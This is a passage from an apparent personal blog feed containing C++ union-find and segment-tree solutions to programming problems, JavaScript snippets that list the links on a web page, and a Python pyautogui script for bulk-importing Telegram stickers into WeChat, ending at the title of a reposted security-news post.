n,m;</span><br><span class="line">    <span class="keyword">int</span> k,x,y;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>&amp;&amp;m==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//先将自身作为祖先节点。 </span></span><br><span class="line">            pre[i] = i;  </span><br><span class="line">            a[i] = <span class="number">1</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//给出集合每个集合人数，以及第一个人的编号 </span></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;k,&amp;x);</span><br><span class="line">            k--;</span><br><span class="line">            <span class="keyword">while</span>(k--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;y);</span><br><span class="line">                merge(x,y); </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[<span class="built_in">find</span>(<span class="number">0</span>)]);<span class="comment">//find(0)是为了找到0的根a[0的根]代表a下有多少人，这些人跟0同根则会感染</span></span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Risk-degree"><a href="#Risk-degree" class="headerlink" title="Risk degree"></a>Risk degree</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem(a,b) memset(a,b,sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000+20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mod 10007</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 1000000+10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> u[N], v[N], pre[N];</span><br><span class="line"><span class="keyword">int</span> n, m, a, b;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n; i++) &#123;</span><br><span class="line">pre[i] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x == pre[x])</span><br><span class="line"><span class="keyword">return</span> x; <span class="keyword">else</span> &#123;</span><br><span class="line">pre[x] = <span class="built_in">find</span>(pre[x]);</span><br><span class="line"><span class="keyword">return</span> pre[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mix</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line"><span class="keyword">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span> (fx != fy) &#123;</span><br><span class="line">pre[fx] = fy;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">()</span><span class="comment">//判断a和b是否相连 &#123;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> fx </span>= <span class="built_in">find</span>(a), fy = <span class="built_in">find</span>(b);</span><br><span class="line"><span class="keyword">if</span> (fx == fy)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">freopen(<span class="string">"input.txt"</span>,<span class="string">"r"</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;m; i++) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u[i], &amp;v[i]);</span><br><span class="line">mix(u[i], v[i]);</span><br><span class="line"><span class="comment">//加入并查集</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;a, &amp;b);</span><br><span class="line"><span class="keyword">if</span> (judge() == <span class="number">0</span>)<span class="comment">//如果这两个不连通直接输出-1 &#123;</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-1"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//枚举每一个点 &#123;</span></span><br><span class="line"><span class="keyword">if</span> (i == a || i == b)<span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">//不能是所要求的的这个点，要查询的两个点不能删去，不然肯定      //不通</span></span><br><span class="line">init();</span><br><span class="line"><span class="comment">//重新初始化</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j&lt;m; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (u[j] == i || v[j] == i)<span class="comment">//去除这个点所在的边，去除后对整个图进行连接，如果</span></span><br><span class="line"><span class="comment">//最后还能联通，即这两个点的根是同一个，就说明这个不   //是关键点</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">mix(u[j], v[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fx = <span class="built_in">find</span>(a), fy = <span class="built_in">find</span>(b);</span><br><span class="line"><span class="keyword">if</span> (fx != fy)</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线段树-Interval-Tree"><a href="#线段树-Interval-Tree" class="headerlink" title="线段树|Interval Tree"></a>线段树|Interval Tree</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://acm.hdu.edu.cn/showproblem.php?pid=1166</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_N 50000</span></span><br><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line"><span class="comment">//记录总兵数</span></span><br><span class="line"><span class="keyword">int</span> num[MAX_N + <span class="number">1</span>] = &#123;</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="comment">//记录各个兵营的兵数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  <span class="title">node</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> left;</span><br><span class="line"><span class="keyword">int</span> right;</span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line">node* lchild;</span><br><span class="line">node* rchild;</span><br><span class="line">node() &#123;</span><br><span class="line">left = right = data = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Tree;</span><br><span class="line"><span class="function">Tree* <span class="title">CreateTree</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">Tree* r;</span><br><span class="line">r = (Tree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Tree));</span><br><span class="line">r-&gt;left = a;</span><br><span class="line">r-&gt;right = b;</span><br><span class="line"><span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">r-&gt;data = num[a];</span><br><span class="line">r-&gt;lchild = r-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> mid = (a + b) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">r-&gt;lchild = CreateTree(a, mid);</span><br><span class="line">r-&gt;rchild = CreateTree(mid + <span class="number">1</span>, b);</span><br><span class="line">r-&gt;data = r-&gt;lchild-&gt;data + r-&gt;rchild-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(Tree* r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (r-&gt;left == a &amp;&amp; r-&gt;right == a) &#123;</span><br><span class="line">r-&gt;data += b;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> mid = (r-&gt;left + r-&gt;right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (a &lt;= mid) &#123;</span><br><span class="line">insert(r-&gt;lchild, a, b);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">insert(r-&gt;rchild, a, b);</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;data += b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(Tree* r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (r-&gt;left == a &amp;&amp; r-&gt;right == b) &#123;</span><br><span class="line">sum += r-&gt;data;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> mid = (r-&gt;left + r-&gt;right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (b &lt;= mid) &#123;</span><br><span class="line"><span class="built_in">find</span>(r-&gt;lchild, a, b);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (a&gt;mid) &#123;</span><br><span class="line"><span class="built_in">find</span>(r-&gt;rchild, a, b);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">find</span>(r-&gt;lchild, a, mid);</span><br><span class="line"><span class="built_in">find</span>(r-&gt;rchild, mid + <span class="number">1</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t, n, x, y;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> ca = <span class="number">0</span>;</span><br><span class="line">freopen(<span class="string">"input.txt"</span>,<span class="string">"r"</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line"><span class="keyword">while</span> (t--) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Case %d:\n"</span>, ++ca);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i]);</span><br><span class="line">&#125;</span><br><span class="line">Tree* T;</span><br><span class="line">T = CreateTree(<span class="number">1</span>, n);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; str) &#123;</span><br><span class="line"><span class="keyword">if</span> (str == <span class="string">"Query"</span>) &#123;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line"><span class="built_in">find</span>(T, x, y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, sum);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (str == <span class="string">"Add"</span>) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line">insert(T, x, y);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (str == <span class="string">"Sub"</span>) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line">insert(T, x, -y);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Code Library</title>
      <link href="/2020/10/27/JavaScript-Code-Library/"/>
      <url>/2020/10/27/JavaScript-Code-Library/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-code blink-slow"></i><em>convenient for code write</em></p><p><strong>获得当前网页元素上的所有的链接</strong> </p><hr><ul><li><p>Method 1 (short) </p><p><a href="https://en.wikipedia.org/wiki/Prototype_JavaScript_Framework#The_$()_function" target="_blank" rel="noopener">参考</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[...new <span class="built_in">Set</span>(<span class="built_in">Array</span>.from(<span class="built_in">document</span>.querySelectorAll(<span class="string">'[src],[href]'</span>)).map(<span class="function"><span class="params">i</span>=&gt;</span>i.src||i.href))]</span><br><span class="line">[...new <span class="built_in">Set</span>(<span class="built_in">Array</span>.from($$(<span class="string">'[src],[href]'</span>)).map(<span class="function"><span class="params">i</span>=&gt;</span>i.src||i.href))]</span><br><span class="line"><span class="comment">// ...剥衣;new Set去重;$$=document.querySelectorAll</span></span><br></pre></td></tr></table></figure></li><li><p>human-readable</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> urls = []</span><br><span class="line">$$(<span class="string">'*'</span>).forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">  urls.push(i.src)</span><br><span class="line">  urls.push(i.href)</span><br><span class="line">  urls.push(i.url)</span><br><span class="line">&#125;); </span><br><span class="line"><span class="built_in">console</span>.log(...new <span class="built_in">Set</span>(urls))</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*) means all elements</span></span><br></pre></td></tr></table></figure></li><li><p>human-readable( with regex )</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> urls = []</span><br><span class="line">$$(<span class="string">'*'</span>).forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">  urls.push(i.src)</span><br><span class="line">  urls.push(i.href)</span><br><span class="line">  urls.push(i.url)</span><br><span class="line">&#125;); </span><br><span class="line">regexUrls= $.grep(urls, <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;<span class="keyword">return</span> n.match(<span class="regexp">/.*http:/</span><span class="regexp">/XXX.COM.*/i</span>)&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;); <span class="built_in">console</span>.log(...new <span class="built_in">Set</span>(regexUrls))</span><br><span class="line">       </span><br><span class="line"><span class="comment">// http://XXX.COM. change to your search target</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telegram提取Stickers到Wechat</title>
      <link href="/2020/10/22/%E5%A6%82%E4%BD%95%E6%8A%8ATelegram%E7%9A%84sticker%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E5%88%B0Wechat%E9%87%8C/"/>
      <url>/2020/10/22/%E5%A6%82%E4%BD%95%E6%8A%8ATelegram%E7%9A%84sticker%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E5%88%B0Wechat%E9%87%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Telegram提取Stickers到Wechat"><a href="#Telegram提取Stickers到Wechat" class="headerlink" title="Telegram提取Stickers到Wechat"></a>Telegram提取Stickers到Wechat</h1><h2 id="步骤1（使用telegram-Bot转换出Stickers"><a href="#步骤1（使用telegram-Bot转换出Stickers" class="headerlink" title="步骤1（使用telegram Bot转换出Stickers)"></a>步骤1（使用telegram Bot转换出Stickers)</h2><p>在Telegram上用global寻找一些可用的stickers转换机器人，将其批量转换为jpg等图片格式，压缩整合打包后下载到本地</p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201022193440141.png" alt="image-20201022193440141" style="zoom: 80%;" /><h2 id="步骤2（批量转换各种非gif格式）"><a href="#步骤2（批量转换各种非gif格式）" class="headerlink" title="步骤2（批量转换各种非gif格式）"></a>步骤2（批量转换各种非gif格式）</h2><p>由于wechat的奇怪特性，只有格式为<code>GIF</code>的图片才可以激活右键某图片出现的&lt;添加到表情&gt;按钮，所以所有的图片都要变为<code>GIF</code></p><p><em>转换过程省略。条条大路通罗马</em></p><p>同时修改微信的设置</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201022203130853.png" alt="image-20201022203130853"></p><h2 id="步骤3-（批量导入表情）"><a href="#步骤3-（批量导入表情）" class="headerlink" title="步骤3 （批量导入表情）"></a>步骤3 （批量导入表情）</h2><p>由于微信自身不带有任何批量导入的功能，所以用户可以通过某些助手来帮助表情包的批量导入，或者，通过<code>Python</code>:sunglasses:</p><p>代码如下，(<a href="https://www.zhihu.com/question/36939285/answer/105995868" target="_blank" rel="noopener">参考</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="comment"># 自动按键</span></span><br><span class="line"><span class="keyword">import</span> pyperclip <span class="comment"># 操作剪贴板</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm_notebook <span class="comment"># 进度条</span></span><br><span class="line"></span><br><span class="line">pyautogui.PAUSE = <span class="number">1</span> <span class="comment"># 暂停时长，1s差不多了</span></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">"X:\\xxx\\"</span></span><br><span class="line"></span><br><span class="line">position_send_file = pyautogui.position() <span class="comment"># 取坐标 发送文件按钮</span></span><br><span class="line"></span><br><span class="line">position_new_photo = pyautogui.position() <span class="comment"># 取坐标 新发的图片</span></span><br><span class="line"></span><br><span class="line">position_add_emoji = pyautogui.position() <span class="comment"># 取坐标 添加到表情</span></span><br><span class="line"></span><br><span class="line">file_name_list = os.listdir(file_path) <span class="comment"># 所有的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> tqdm_notebook(file_name_list):</span><br><span class="line">    <span class="keyword">if</span> file_name.endwith(<span class="string">"gif"</span>)==<span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">"error, please check "</span>+file_name)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pyperclip.copy(file_path + file_name) <span class="comment"># 文件名拷到剪贴板</span></span><br><span class="line">    pyautogui.click(position_send_file) <span class="comment"># 发送文件</span></span><br><span class="line">    pyautogui.hotkey(<span class="string">'ctrl'</span>, <span class="string">'v'</span>) <span class="comment"># 粘贴到文件框</span></span><br><span class="line">    pyautogui.hotkey(<span class="string">'enter'</span>) <span class="comment"># 打开</span></span><br><span class="line">    pyautogui.hotkey(<span class="string">'enter'</span>) <span class="comment"># 发送        </span></span><br><span class="line">    pyautogui.click(position_new_photo, button=<span class="string">'right'</span>) <span class="comment"># 右键新发的图片</span></span><br><span class="line">    pyautogui.click(position_add_emoji) <span class="comment"># 添加到表情</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/file/insert_Stickers.ipynb" target="_blank" rel="noopener">Jupyter源文件</a></p><p>分析：</p><p>由于微信的种种限制，直接用实现类似按键精灵一样的代码语言去直接操作，重复简单的手动过程，是实现微信各种批处理的最有效直接的方法。</p><p>以上代码采用<code>pyautogui</code>与<code>pyperclip</code>来模拟用户操作，由于需要读取尺寸坐标，所以该代码最好的方法是在jupyter上运行，运用<code>juypter</code>上的<code>cell</code>运行特质，逐步给各个操作正确的尺寸定位，以完成后续批处理时的正确点击。</p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201022205125871.png" alt="image-20201022205125871"></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201022205159088.png" alt="image-20201022205159088"></p>]]></content>
      
      
      <categories>
          
          <category> 个人趣记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jupyter </tag>
            
            <tag> Instant Message </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.10.19-11.1一周安全知识动态</title>
      <link href="/2020/10/19/%5B%E8%BD%AC%5D2020.10.19-11.1%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/19/%5B%E8%BD%AC%5D2020.10.19-11.1%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
